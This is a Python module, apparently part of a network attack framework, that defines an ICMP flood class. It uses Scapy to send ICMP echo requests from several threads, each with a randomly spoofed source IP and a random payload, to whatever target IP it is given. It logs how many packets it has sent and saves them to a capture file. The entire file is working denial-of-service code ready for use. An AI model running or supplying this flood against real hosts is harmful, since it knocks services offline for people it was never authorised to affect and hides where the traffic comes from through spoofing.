import random, threading
from scapy.all import Ether, IP, ICMP, sendp, get_if_hwaddr
from attacks.base import BaseAttack


class IcmpFlood(BaseAttack):
    def run(self):
        target_ip = self.params.get("target_ip", "")
        threads_n = int(self.params.get("threads", 4))

        if not target_ip:
            self.log("ICMP Flood: no target IP", "error"); return

        dst_mac  = self.resolve_mac(target_ip)
        src_mac  = get_if_hwaddr(self.iface)
        writer   = self.open_pcap()
        counters = {"sent": 0}
        lock     = threading.Lock()

        self.log(f"ICMP Flood → {target_ip} ({threads_n} threads)", "warn")

        def sender():
            while not self._stop.is_set():
                spoof = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
                pkt = (
                    Ether(src=src_mac, dst=dst_mac)
                    / IP(src=spoof, dst=target_ip)
                    / ICMP(type=8, code=0, id=random.randint(0, 0xFFFF))
                    / bytes(random.getrandbits(8) for _ in range(64))
                )
                try:
                    sendp(pkt, iface=self.iface, verbose=False)
                    with lock:
                        self.write(pkt)
                        counters["sent"] += 1
                        n = counters["sent"]
                    if n % 500 == 0:
                        self.log(f"ICMP Flood: {n:,} packets sent", "info")
                except Exception as e:
                    self.log(f"ICMP Flood error: {e}", "error"); break

        workers = [threading.Thread(target=sender, daemon=True) for _ in range(threads_n)]
        for w in workers: w.start()
        for w in workers: w.join()
        writer.close()
